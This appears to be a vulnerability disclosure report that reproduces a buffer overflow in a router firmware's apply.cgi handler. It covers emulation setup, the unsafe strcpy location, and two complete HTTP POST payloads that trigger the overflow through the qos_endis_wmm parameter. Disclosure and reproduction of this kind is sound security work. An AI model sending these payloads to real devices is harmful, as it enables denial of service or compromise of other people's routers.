Vulnerability Research Environment:

Verification is carried out through simulation. The current environment in the attachment has had the authentication step patched, and the unpatched environment can be obtained by using binwalk to extract the corresponding firmware from the download link.

Simulation is done using Greenhouse, and the Greenhouse link is [https://github.com/sefcom/greenhouse](https://github.com/sefcom/greenhouse). The specific commands for setting up the simulation environment can be found at [https://github.com/sefcom/greenhouse/blob/master/MANUAL.md](https://github.com/sefcom/greenhouse/blob/master/MANUAL.md).

I have included the rehost image in the attachment, and the startup command is to navigate to the dockerfile directory, then run `docker-compose build`, followed by `docker-compose up`.

Additionally, I have attached the script used for sending packets. The usage is: `python3 send.py + filename`.

Target Configuration:

No special configurations were made; the default simulation environment is used.

The vulnerability location: 

The call to strcpy at address 0x409B54 in the function sub_409B00.

Specific Verification Process:

1. Send the first packet, setting the routing information to apply.cgi, which allows entry into the function sub_409B00. This function calls the do_setting function to extract the value of qos_endis_wmm from the URL and sets it as the value of endis_wl_wmm.

```json
{
  "request": {
    "method": "POST",
    "prefix": "/apply.cgi",
    "version": "1.1"
  },
  "header": {
    "Host": "123",
    "Content-Length": "1000"
  },
  "body":"qos_endis_wmm=111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111&qos_endis_wmm_a=2&submit_flag=apply_qos",
  "possible_type": "normal"
}
```
2. Send the second packet, setting the routing information to apply.cgi, which enters the function sub_409B00. This function propagates the value of endis_wl_wmm into the strcpy function, causing a buffer overflow.

```json
{
  "request": {
    "method": "POST",
    "prefix": "/apply.cgi",
    "version": "1.1"
  },
  "header": {
    "Host": "123",
    "Content-Length": "1000"
  },
  "body":"change_wan_type=1&submit_flag=apply_qos",
  "possible_type": "normal"
}
```
![alt text](image.png)